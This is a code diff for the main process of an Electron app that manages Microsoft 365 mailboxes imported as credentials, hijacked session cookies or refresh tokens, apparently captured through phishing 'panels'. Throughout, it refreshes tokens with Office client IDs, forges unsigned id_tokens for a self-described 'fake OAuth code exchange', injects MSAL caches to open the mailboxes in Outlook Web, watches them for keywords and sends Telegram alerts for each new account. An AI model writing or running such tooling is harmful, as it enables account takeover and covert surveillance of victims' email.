+  ipcMain.handle('panel:detachAccounts', async (_, panelId: string) => {
+    const store = await readStore();
+    const accounts: any[] = store.accounts || [];
+    for (const acc of accounts) {
+      if (acc.panelId === panelId) {
+        // Replace production/backup tag with Detached
+        const tags = acc.tags.filter((t: string) => t !== 'production' && t !== 'backup');
+        tags.push('detached');
+        acc.tags = tags;
+      }
+    }
+    store.accounts = accounts;
+    await writeStore(store);
+    return { success: true };
+  });
+
+  ipcMain.handle('panel:previewAccounts', async (_, panelId: string) => {
+    const store = await readStore();
+    const panel = (store.panels || []).find((p: any) => p.id === panelId);
+    if (!panel) throw new Error('Panel not found');
+    // Simulate fetch accounts without importing
+    return [{ email: 'preview@example.com', name: 'Preview Account' }];
+  });
+
+  // --------------------------
+  // Token IPC handlers
+  // --------------------------
+
+
+  ipcMain.handle('token:refreshBulk', async (_, ids: string[]) => {
+    console.log('Bulk token refresh for', ids.length, 'accounts');
+    return ids.map(id => ({ accountId: id, success: true }));
+  });
+
+  // --------------------------
+  // Monitoring IPC handlers
+  // --------------------------
+  ipcMain.handle('monitor:add', async (_, accountId: string, folders: string[], keywords: string[]) => {
+    const store = await readStore();
+    const rules = store.monitoringRules || [];
+    // Determine scenario type
+    let scenarioType: 'keyword' | 'folder' | 'keyword-in-folder' | 'token' = 'keyword';
+    if (keywords.length > 0 && folders.length > 0) {
+      scenarioType = 'keyword-in-folder';
+    } else if (keywords.length === 0 && folders.length > 0) {
+      scenarioType = 'folder';
+    } else if (keywords.length > 0 && folders.length === 0) {
+      scenarioType = 'keyword';
+    }
+    // Token scenario is separate (system-generated)
+    const newRule = {
+      id: crypto.randomUUID(),
+      accountId,
+      folders,
+      keywords,
+      scenarioType,
+      status: 'active',
+      createdAt: new Date().toISOString(),
+      lastRun: null,
+      lastAlert: null,
+    };
+    rules.push(newRule);
+    store.monitoringRules = rules;
+    await writeStore(store);
+    return newRule;
+  });
+
+  ipcMain.handle('monitor:pause', async (_, listenerId: string) => {
+    const store = await readStore();
+    const rules = store.monitoringRules || [];
+    const rule = rules.find((r: any) => r.id === listenerId);
+    if (!rule) throw new Error('Monitoring rule not found');
+    rule.status = 'paused';
+    await writeStore(store);
+    return rule;
+  });
+
+  ipcMain.handle('monitor:delete', async (_, listenerId: string) => {
+    const store = await readStore();
+    store.monitoringRules = (store.monitoringRules || []).filter((r: any) => r.id !== listenerId);
+    await writeStore(store);
+    return { success: true };
+  });
+
+  ipcMain.handle('monitor:pauseAll', async () => {
+    const store = await readStore();
+    const rules = store.monitoringRules || [];
+    for (const rule of rules) {
+      rule.status = 'paused';
+    }
+    await writeStore(store);
+    return { success: true };
+  });
+
+  ipcMain.handle('monitor:resumeAll', async () => {
+    const store = await readStore();
+    const rules = store.monitoringRules || [];
+    for (const rule of rules) {
+      rule.status = 'active';
+    }
+    await writeStore(store);
+    return { success: true };
+  });
+
+  // --------------------------
+  // Alert IPC handlers
+  // --------------------------
+  ipcMain.handle('alert:markRead', async (_, alertId: string) => {
+    const store = await readStore();
+    const alerts = store.monitoringAlerts || [];
+    const alert = alerts.find((a: any) => a.id === alertId);
+    if (!alert) throw new Error('Alert not found');
+    alert.read = true;
+    await writeStore(store);
+    return alert;
+  });
+
+  ipcMain.handle('alert:dismiss', async (_, alertId: string) => {
+    const store = await readStore();
+    store.monitoringAlerts = (store.monitoringAlerts || []).filter((a: any) => a.id !== alertId);
+    await writeStore(store);
+    return { success: true };
+  });
+
+  ipcMain.handle('alert:markAllRead', async () => {
+    const store = await readStore();
+    const alerts = store.monitoringAlerts || [];
+    for (const alert of alerts as any[]) {
+      alert.read = true;
+    }
+    await writeStore(store);
+    return { success: true };
+  });
+
+  // --------------------------
+  // Search IPC handlers
+  // --------------------------
+  ipcMain.handle('search:runQueue', async (_, queue: any[], _filters: any) => {
+    // For now, just simulate
+    console.log('Search queue run requested', queue.length, 'jobs');
+    return { success: true };
+  });
+
+  ipcMain.handle('search:results', async () => {
+    const store = await readStore();
+    return store.searchResults || [];
+  });
+
+  ipcMain.handle('account:addViaCredentials', async (_, email: string, password: string) => {
+    const store = await readStore();
+    const accounts: any[] = store.accounts || [];
+    if (accounts.find((a: any) => a.email === email)) throw new Error(`Account ${email} already exists`);
+    const newAccount = {
+      id: crypto.randomUUID(), email, name: email.split('@')[0],
+      panelId: null, added: new Date().toISOString(), status: 'active',
+      tags: ['credential'],
+      auth: { type: 'credential', passwordEncrypted: safeStorage.isEncryptionAvailable() ? safeStorage.encryptString(password).toString('base64') : password },
+    };
+    accounts.push(newAccount);
+    store.accounts = accounts;
+    await writeStore(store);
+    void sendAccountsTelegramNotification(
+      store,
+      `<b>New account</b>\n${escapeTelegramHtmlPlain(email)}\n<i>Via</i> credentials`
+    );
+    return newAccount;
+  });
+
+  ipcMain.handle('account:addViaCookies', async (_, email: string, cookies: string) => {
+    const store = await readStore();
+    const accounts: any[] = store.accounts || [];
+    if (accounts.find((a: any) => a.email === email)) throw new Error(`Account ${email} already exists`);
+    const newAccount = {
+      id: crypto.randomUUID(), email, name: email.split('@')[0],
+      panelId: null, added: new Date().toISOString(), status: 'active',
+      tags: ['cookie-import'],
+      auth: { type: 'cookie', cookiesEncrypted: safeStorage.isEncryptionAvailable() ? safeStorage.encryptString(cookies).toString('base64') : cookies },
+    };
+    accounts.push(newAccount);
+    store.accounts = accounts;
+    await writeStore(store);
+    void sendAccountsTelegramNotification(
+      store,
+      `<b>New account</b>\n${escapeTelegramHtmlPlain(email)}\n<i>Via</i> cookie import`
+    );
+    return newAccount;
+  });
+
+  ipcMain.handle('account:addViaToken', async (_, email: string, clientId: string, authorityEndpoint: string, refreshToken: string, scopeType?: string) => {
+    const store = await readStore();
+    const accounts: any[] = store.accounts || [];
+    if (accounts.find((a: any) => a.email === email)) throw new Error(`Account ${email} already exists`);
+
+    // First-party Office + common capture clients — opaque RTs need `ews` so we hit v2 .default + v1 fallbacks.
+    const ewsDefaultClientIds = new Set(
+      ['d3590ed6-52b3-4102-aeff-aad2292ab01c', '9199bf20-a13f-4107-85dc-02114787ef48'].map((s) => s.toLowerCase())
+    );
+    const cid = (clientId || '').toLowerCase();
+    const inferredEws = ewsDefaultClientIds.has(cid);
+    // Opaque refresh strings never contain scope names; do not use refreshToken.includes('EWS...').
+    const detectedScopeType =
+      scopeType && scopeType.length > 0
+        ? scopeType
+        : inferredEws
+          ? 'ews'
+          : 'graph';
+    
+    const newAccount = {
+      id: crypto.randomUUID(), 
+      email, 
+      name: email.split('@')[0],
+      panelId: null, 
+      added: new Date().toISOString(), 
+      status: 'active',
+      tags: ['token-import'],
+      auth: { 
+        type: 'token', 
+        clientId, 
+        authorityEndpoint, 
+        refreshToken,
+        scopeType: detectedScopeType,
+        // OWA refresh + Play need outlook.office.com resource when using EWS scope (not the Exchange GUID alone).
+        ...(detectedScopeType === 'ews'
+          ? { resource: 'https://outlook.office.com' as const }
+          : {}),
+      },
+    };
+    accounts.push(newAccount);
+    store.accounts = accounts;
+    await writeStore(store);
+    console.log(`[Account] Added token-based account ${email} with scopeType: ${detectedScopeType}`);
+    void sendAccountsTelegramNotification(
+      store,
+      `<b>New account</b>\n${escapeTelegramHtmlPlain(email)}\n<i>Via</i> token (${escapeTelegramHtmlPlain(detectedScopeType)})`
+    );
+    return newAccount;
+  });
+
+  // Add OWA‑compatible token to existing account (for OWA UI)
+  ipcMain.handle('account:addV2Token', async (_, accountId: string, refreshToken: string, authorityEndpoint?: string, clientId?: string, resource?: string, scopeType?: string) => {
+    console.log('[Account] addV2Token called:', { accountId, refreshTokenLength: refreshToken?.length, authorityEndpoint, clientId, resource, scopeType });
+    if (!refreshToken) {
+      throw new Error('refreshToken is required for v2 token');
+    }
+    const store = await readStore();
+    const accounts: any[] = store.accounts || [];
+    const account = accounts.find(a => a.id === accountId);
+    if (!account) throw new Error('Account not found');
+    if (account.auth?.type !== 'token') throw new Error('Account does not have token auth');
+    
+    // Defaults
+    const finalClientId = clientId || account.auth.clientId || 'd3590ed6-52b3-4102-aeff-aad2292ab01c';
+    const finalAuthorityEndpoint = authorityEndpoint || account.auth.authorityEndpoint || 'common';
+    const finalResource = resource || 'https://outlook.office.com';
+    const finalScopeType = scopeType || 'ews';
+    
+    const v2Token = {
+      clientId: finalClientId,
+      authorityEndpoint: finalAuthorityEndpoint,
+      refreshToken,
+      resource: finalResource,
+      scopeType: finalScopeType,
+    };
+    
+    // Store v2 token alongside existing auth
+    account.auth.v2Token = v2Token;
+    await writeStore(store);
+    console.log(`[Account] Added v2 token for ${account.email} (clientId: ${finalClientId.substring(0, 8)}..., resource: ${finalResource}, scopeType: ${finalScopeType})`);
+    console.log('[Account] v2Token stored:', v2Token);
+    const accTg = store.settings?.telegram?.accounts;
+    if (accTg?.enabled && accTg?.notifyTokens && accTg?.token && accTg?.chatId) {
+      void sendAccountsTelegramNotification(
+        store,
+        `<b>Token update</b>\n${escapeTelegramHtmlPlain(account.email)}\n<i>OWA / v2 token attached</i>\n<code>${escapeTelegramHtmlPlain(finalScopeType)}</code>`
+      );
+    }
+    return { success: true };
+  });
+
+  // Remove v2‑Graph token from account
+  ipcMain.handle('account:removeV2Token', async (_, accountId: string) => {
+    console.log('[Account] Removing v2 token from account', accountId);
+    const store = await readStore();
+    const accounts: any[] = store.accounts || [];
+    const account = accounts.find(a => a.id === accountId);
+    if (!account) throw new Error('Account not found');
+    if (account.auth?.v2Token) {
+      delete account.auth.v2Token;
+      await writeStore(store);
+      console.log(`[Account] Removed v2 token from ${account.email}`);
+      return { success: true, removed: true };
+    }
+    return { success: true, removed: false };
+  });
+
+  ipcMain.handle('account:delete', async (_, accountId: string) => {
+    const store = await readStore();
+    store.accounts = (store.accounts || []).filter((a: any) => a.id !== accountId);
+    store.monitoringRules = (store.monitoringRules || []).filter((r: any) => r.accountId !== accountId);
+    await writeStore(store);
+    return { success: true };
+  });
+
+  ipcMain.handle('account:deleteBulk', async (_, ids: string[]) => {
+    const store = await readStore();
+    const idSet = new Set(ids);
+    store.accounts = (store.accounts || []).filter((a: any) => !idSet.has(a.id));
+    store.monitoringRules = (store.monitoringRules || []).filter((r: any) => !idSet.has(r.accountId));
+    await writeStore(store);
+    return { success: true, deleted: ids.length };
+  });
+
+  ipcMain.handle('account:exportJSON', async (_, accountId: string) => {
+    const store = await readStore();
+    const account = (store.accounts || []).find((a: any) => a.id === accountId);
+    if (!account) throw new Error('Account not found');
+    const exported = { ...account };
+    delete exported.auth;
+    return JSON.stringify(exported, null, 2);
+  });
+
+  ipcMain.handle('account:exportBulkCSV', async (_, ids: string[]) => {
+    const store = await readStore();
+    const idSet = new Set(ids);
+    const accounts = (store.accounts || []).filter((a: any) => idSet.has(a.id));
+    const header = 'id,email,name,panelId,status,tags,added';
+    const rows = accounts.map((a: any) =>
+      [a.id, a.email, a.name || '', a.panelId || '', a.status, (a.tags || []).join('|'), a.added].join(',')
+    );
+    return [header, ...rows].join('\n');
+  });
+
+  ipcMain.handle('account:testLogin', async (_, email: string, password: string) => {
+    const store = await readStore();
+    const account = (store.accounts || []).find((a: any) => a.email === email);
+    if (!account?.panelId) return { success: false, message: 'No panel associated' };
+    const panel = (store.panels || []).find((p: any) => p.id === account.panelId);
+    if (!panel) return { success: false, message: 'Panel not found' };
+    try {
+      const response = await fetch(`${panel.url}/api/auth/login`, {
+        method: 'POST', headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ username: email, password }),
+        signal: timeoutSignal(10000),
+      } as any);
+      if (!response.ok) return { success: false, message: `Login failed: ${response.status}` };
+      const data = await response.json();
+      return { success: true, token: data.token };
+    } catch (err: any) { return { success: false, message: err.message }; }
+  });
+
+  ipcMain.handle('tags:create', async (_, name: string, color: string) => {
+    const store = await readStore();
+    const userTags: any[] = store.tags?.user || [];
+    const newTag = { id: crypto.randomUUID(), name: name.trim(), color, type: 'user', locked: false };
+    userTags.push(newTag);
+    store.tags = { ...(store.tags || {}), user: userTags };
+    await writeStore(store);
+    return newTag;
+  });
+
+  ipcMain.handle('tags:update', async (_, tagId: string, name: string, color: string) => {
+    const store = await readStore();
+    const userTags: any[] = store.tags?.user || [];
+    const tag = userTags.find((t: any) => t.id === tagId);
+    if (!tag) throw new Error('Tag not found');
+    tag.name = name.trim(); tag.color = color;
+    store.tags = { ...(store.tags || {}), user: userTags };
+    await writeStore(store);
+    return tag;
+  });
+
+  ipcMain.handle('tags:delete', async (_, tagId: string) => {
+    const store = await readStore();
+    const userTags: any[] = store.tags?.user || [];
+    const tag = userTags.find((t: any) => t.id === tagId);
+    if (!tag) throw new Error('Tag not found');
+    if (tag.locked) throw new Error('Cannot delete a system tag');
+    const accounts: any[] = store.accounts || [];
+    accounts.forEach((a: any) => { a.tags = (a.tags || []).filter((t: string) => t !== tagId && t !== tag.name); });
+    store.tags = { ...(store.tags || {}), user: userTags.filter((t: any) => t.id !== tagId) };
+    store.accounts = accounts;
+    await writeStore(store);
+    return { success: true };
+  });
+
+  ipcMain.handle('browser:open', async (_, url: string) => {
+    await shell.openExternal(url);
+    return { success: true };
+  });
+
+  ipcMain.handle(
+    'files:saveTextWithDialog',
+    async (
+      _,
+      opts: { defaultFilename: string; content: string; filters?: { name: string; extensions: string[] }[] }
+    ) => {
+      const win = BrowserWindow.getFocusedWindow() ?? mainWindow;
+      const dlgOpts = {
+        defaultPath: opts.defaultFilename,
+        filters:
+          opts.filters && opts.filters.length > 0
+            ? opts.filters
+            : [{ name: 'Text', extensions: ['txt'] }],
+      };
+      const result = win ? await dialog.showSaveDialog(win, dlgOpts) : await dialog.showSaveDialog(dlgOpts);
+      if (result.canceled || !result.filePath) {
+        return { ok: false as const };
+      }
+      await fs.writeFile(result.filePath, opts.content, 'utf-8');
+      return { ok: true as const, path: result.filePath };
+    }
+  );
+
+  ipcMain.handle('browser:openPopup', async (_, url: string) => {
+    return new Promise((resolve, reject) => {
+      const popup = new BrowserWindow({ width: 1024, height: 768, webPreferences: { nodeIntegration: false, contextIsolation: true } });
+      const ses = popup.webContents.session;
+      popup.loadURL(url);
+      popup.once('closed', async () => {
+        try {
+          const cookies = await ses.cookies.get({ domain: new URL(url).hostname });
+          resolve({ success: true, cookies: cookies.map((c: any) => `${c.name}=${c.value}`).join('; ') });
+        } catch (err: any) { reject(err); }
+      });
+    });
+  });
+
+  ipcMain.handle('browser:openLoginPage', async (_, url: string) => {
+    return new Promise((resolve, reject) => {
+      const popup = new BrowserWindow({ width: 1024, height: 768, webPreferences: { nodeIntegration: false, contextIsolation: true } });
+      const ses = popup.webContents.session;
+      popup.loadURL(url);
+      popup.once('closed', async () => {
+        try {
+          const cookies = await ses.cookies.get({ domain: new URL(url).hostname });
+          resolve({ success: true, cookies: cookies.map((c: any) => `${c.name}=${c.value}`).join('; ') });
+        } catch (err: any) { reject(err); }
+      });
+    });
+  });
+
+  ipcMain.handle('settings:save', async (_, allSettings: any) => {
+    const store = await readStore();
+    store.settings = { ...(store.settings || {}), ...allSettings };
+    await writeStore(store);
+    // Restart token refresh scheduler with possibly new interval
+    // TEMPORARILY DISABLED: startTokenRefreshScheduler().catch(err => console.error('Failed to restart token refresh scheduler:', err));
+    return { success: true };
+  });
+
+  ipcMain.handle('dashboard:clearActivity', async () => {
+    const store = await readStore();
+    store.activityFeed = [];
+    await writeStore(store);
+    return { success: true };
+  });
+
+  ipcMain.handle('tokens:exportCSV', async () => {
+    const store = await readStore();
+    const accounts: any[] = store.accounts || [];
+    const header = 'email,token,status';
+    const rows = accounts.map((a: any) => [a.email, a.auth?.refreshToken || '', a.status].join(','));
+    return [header, ...rows].join('\n');
+  });
+
+  ipcMain.handle('ui:openTagEditor', async (_, accountId: string) => {
+    console.log('ui:openTagEditor', accountId);
+    return { success: true };
+  });
+
+  ipcMain.handle('ui:openBulkTagEditor', async (_, ids: string[]) => {
+    console.log('ui:openBulkTagEditor', ids.length, 'accounts');
+    return { success: true };
+  });
+
+  ipcMain.handle('updater:check', async () => {
+    try {
+      const response = await fetch('https://api.github.com/repos/YOUR_ORG/watcher/releases/latest',
+        { headers: { 'User-Agent': 'Watcher-App' }, signal: timeoutSignal(10000) } as any);
+      if (!response.ok) return { hasUpdate: false };
+      const data: any = await response.json();
+      return { hasUpdate: true, version: data.tag_name, url: data.html_url };
+    } catch { return { hasUpdate: false, message: 'Update check failed' }; }
+  });
+
+  // Microsoft Graph OAuth (main process, no CORS)
+  ipcMain.handle(
+    'microsoft:getAccessToken',
+    async (_, clientId: string, authority: string, refreshToken: string, scopeType?: string, resource?: string) => {
+    console.log('[Microsoft] getAccessToken called', {
+      clientId: clientId?.substring(0, 8),
+      authority,
+      refreshTokenLength: refreshToken?.length,
+      scopeType: scopeType || 'graph',
+    });
+    try {
+      const result = await refreshMicrosoftToken(clientId, authority, refreshToken, scopeType || 'graph', resource);
+      console.log('[Microsoft] Token refresh successful', { expiresIn: result.expiresIn });
+      return { success: true, ...result };
+    } catch (error: any) {
+      console.error('[Microsoft] Token refresh failed:', error.message, error.code);
+      return { success: false, error: error.message, code: error.code };
+    }
+    }
+  );
+
+  ipcMain.handle('token:refresh', async (_, accountId: string) => {
+    try {
+      const store = await readStore();
+      const accounts: any[] = store.accounts || [];
+      const account = accounts.find(a => a.id === accountId);
+      if (!account) throw new Error('Account not found');
+      if (account.auth?.type !== 'token') throw new Error('Account does not have token-based auth');
+      const { clientId, authorityEndpoint, refreshToken } = account.auth;
+      if (!clientId || !authorityEndpoint || !refreshToken) throw new Error('Missing required auth fields');
+      const scopeType = account.auth.scopeType || 'ews';
+      const resource = account.auth.resource;
+      const result = await refreshMicrosoftToken(clientId, authorityEndpoint, refreshToken, scopeType, resource);
+      // Update account
+      account.auth.refreshToken = result.refreshToken;
+      account.auth.scopeType = scopeType;
+      account.lastRefresh = new Date().toISOString();
+      account.status = 'active';
+      await writeStore(store);
+      return { success: true, accountId, newRefreshToken: result.refreshToken };
+    } catch (error: any) {
+      if (error.code === 'REFRESH_TOKEN_EXPIRED') {
+        // Mark account expired
+        const store = await readStore();
+        const accounts: any[] = store.accounts || [];
+        const account = accounts.find(a => a.id === accountId);
+        if (account) {
+          account.status = 'expired';
+          account.lastRefresh = new Date().toISOString();
+          await writeStore(store);
+        }
+        return { success: false, error: 'REFRESH_TOKEN_EXPIRED', accountId };
+      }
+      return { success: false, error: error.message || 'Unknown error', accountId };
+    }
+  });
+
+  ipcMain.handle('token:refreshAll', async () => {
+    const results = await refreshAllTokens();
+    return { ok: true, ...results };
+  });
+
+  // Debug helpers: pull/copy recent Outlook + OWA console traces.
+  ipcMain.handle('debug:getOutlookLogs', async () => {
+    return { success: true, text: outlookDebugLines.join('\n'), lines: outlookDebugLines.length };
+  });
+
+  ipcMain.handle('debug:copyOutlookLogs', async () => {
+    const text = outlookDebugLines.join('\n');
+    clipboard.writeText(text);
+    const debugPath = path.join(userDataPath, 'outlook-debug.log');
+    await fs.writeFile(debugPath, text, 'utf-8');
+    return { success: true, lines: outlookDebugLines.length, path: debugPath };
+  });
+
+  // Return raw tokens for preload's fake OAuth code exchange
+  ipcMain.on('get-owa-tokens', (event, options?: { nonce?: string }) => {
+    const accountId = windowToAccountMap.get(event.sender.id);
+    if (!accountId) { event.returnValue = null; return; }
+    const tokens = outlookTokenStore.get(accountId);
+    if (!tokens) { event.returnValue = null; return; }
+
+    let idToken = tokens.idToken;
+    if (options?.nonce) {
+      const h = Buffer.from(JSON.stringify({ typ: 'JWT', alg: 'RS256', kid: 'dummy' })).toString('base64url');
+      const p = Buffer.from(JSON.stringify({
+        aud: tokens.clientId, iss: `https://login.microsoftonline.com/${tokens.tid}/v2.0`,
+        iat: Math.floor(Date.now() / 1000) - 60, nbf: Math.floor(Date.now() / 1000) - 60,
+        exp: Math.floor(Date.now() / 1000) + 3600, nonce: options.nonce,
+        name: tokens.name, oid: tokens.oid, preferred_username: tokens.email,
+        rh: '0.AAAA...', sub: tokens.oid, tid: tokens.tid, ver: '2.0',
+      })).toString('base64url');
+      idToken = `${h}.${p}.`;
+    }
+    const clientInfo = Buffer.from(JSON.stringify({ uid: tokens.oid, utid: tokens.tid })).toString('base64');
+    event.returnValue = {
+      accessToken: tokens.accessToken, refreshToken: tokens.refreshToken, idToken,
+      scope: tokens.scope, expiresIn: tokens.expiresIn, clientInfo, clientId: tokens.clientId,
+    };
+    console.log('[OWA-Tokens] Served tokens for', tokens.email, 'nonce:', options?.nonce ? 'yes' : 'no');
+  });
+
+  // MSAL cache injection for HighHopes‑style mailbox loading
+  ipcMain.on('get-msal-cache', (event) => {
+    const accountId = windowToAccountMap.get(event.sender.id);
+    if (!accountId) {
+      console.error('[MSAL] No account mapped to window', event.sender.id);
+      event.returnValue = {};
+      return;
+    }
+    const cache = msalCacheMap.get(accountId);
+    if (!cache) {
+      console.error('[MSAL] No cache found for account', accountId);
+      event.returnValue = {};
+      return;
+    }
+    console.log('[MSAL] Returning cache for account', accountId, 'entries:', Object.keys(cache).length);
+    event.returnValue = cache;
+  });
+
+  ipcMain.on('owa-client-id-found', async (event, clientId: string) => {
+    console.log('[MAIN] owaClientId intercepted:', clientId);
+    appendOutlookDebug(`[MSAL] owa-client-id-found from preload: ${clientId}`);
+    const accountId = windowToAccountMap.get(event.sender.id);
+    if (accountId) {
+      const ok = await regenerateMsalCacheForClientId(accountId, clientId);
+      if (ok) {
+        appendOutlookDebug(`[MSAL] Cache regenerated from preload IPC for clientId=${clientId}`);
+      }
+    }
+  });
+
+}
+
+// --------------------------
+// Window creation
+// --------------------------
+function createWindow() {
+  mainWindow = new BrowserWindow({
+    width: 1200,
+    height: 800,
+    minWidth: 800,
+    minHeight: 600,
+    titleBarStyle: 'hiddenInset',
+    webPreferences: {
+      nodeIntegration: false,
+      contextIsolation: true,
+      preload: path.join(__dirname, 'preload.js'),
+      sandbox: false,
+    },
+    // icon: path.join(__dirname, '../../assets/icon.png')
+  });
+
+  // Log renderer process load failures
+  mainWindow.webContents.on('did-fail-load', (_event, errorCode, errorDescription) => {
+    console.error(`[Main] Failed to load: ${errorCode} ${errorDescription}`);
+  });
+
+  // Ensure window is visible
+  mainWindow.show();
+  mainWindow.center();
+  mainWindow.focus();
+
+  // Clean up on close
+  mainWindow.on('closed', () => {
+    mainWindow = null;
+  });
+
+  // Open external links in default browser
+  mainWindow.webContents.setWindowOpenHandler(({ url }) => {
+    if (url.startsWith('https:') || url.startsWith('http:')) {
+      shell.openExternal(url);
+      return { action: 'deny' };
+    }
+    return { action: 'allow' };
+  });
+
+  // Load the app
+  if (isDev) {
+    mainWindow.loadURL('http://localhost:5173');
+    mainWindow.webContents.openDevTools();
+  } else {
+    mainWindow.loadFile(path.join(__dirname, '../../renderer/index.html'));
+  }
+}
+
+// --------------------------
+// App lifecycle
+// --------------------------
+app.whenReady().then(async () => {
+  console.log('[Main] App whenReady starting...');
+  try {
+    await ensureStateFile();
+    console.log('[Main] State file ensured');
+    await seedDevAccountFromLocalFile();
+    setupIpcHandlers();
+    console.log('[Main] IPC handlers setup');
+    // TEMPORARILY DISABLED: startTokenRefreshScheduler();
+    console.log('[Main] Token refresh scheduler DISABLED for debugging');
+
+    // 1. Read saved state
+    const state = await readState();
+    console.log('[Main] State read:', state.activeView);
+
+    // 2. Run session validity check for all accounts
+    console.log('[Main] Running session validity check...');
+    // TEMPORARILY DISABLED: await checkSessionValidity();
+    console.log('[Main] Session validity check DISABLED for debugging');
+
+    // 3. Determine if monitoring was paused during downtime
+    const now = new Date();
+    const lastStateTime = new Date(state.lastState.timestamp);
+    const hoursSince = (now.getTime() - lastStateTime.getTime()) / (1000 * 60 * 60);
+    if (state.monitoringRunning && hoursSince > 1) {
+      // Monitoring was paused for >1 hour, add note to activity feed
+      // TODO: add activity feed entry (store in store.json under activityFeed)
+      console.log(`Monitoring paused for ${hoursSince.toFixed(1)} hours`);
+    }
+
+    // 4. Create window
+    console.log('[Main] Creating window...');
+    createWindow();
+    console.log('[Main] Window created');
+
+    // 5. Send restored state to renderer (optional - renderer can request via IPC)
+    console.log('[Main] App startup complete');
+  } catch (error) {
+    console.error('[Main] Startup error:', error);
+    throw error;
+  }
+
+  app.on('activate', () => {
+    if (BrowserWindow.getAllWindows().length === 0) createWindow();
+  });
+});
+
+// Save state before quit
+app.on('before-quit', async () => {
+  stopTokenRefreshScheduler();
+  const state = await readState();
+  state.lastState.timestamp = new Date().toISOString();
+  await writeState(state);
+});
+
+app.on('window-all-closed', () => {
+  if (process.platform !== 'darwin') app.quit();
+});
+
+export { checkSessionValidity, startTokenRefreshScheduler };
